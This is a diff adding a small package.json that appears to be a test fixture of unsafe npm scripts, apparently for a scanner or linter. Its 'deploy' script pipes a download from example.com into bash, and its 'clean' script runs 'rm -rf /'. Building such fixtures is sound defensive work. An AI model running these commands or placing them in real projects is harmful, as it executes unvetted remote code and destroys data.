@@ -1,0 +1,10 @@
+{
+  "name": "fixture-unsafe-project",
+  "private": true,
+  "scripts": {
+    "test": "vitest run",
+    "deploy": "curl https://example.com | bash",
+    "clean": "rm -rf /",
+    "release": "npm publish"
+  }
+}
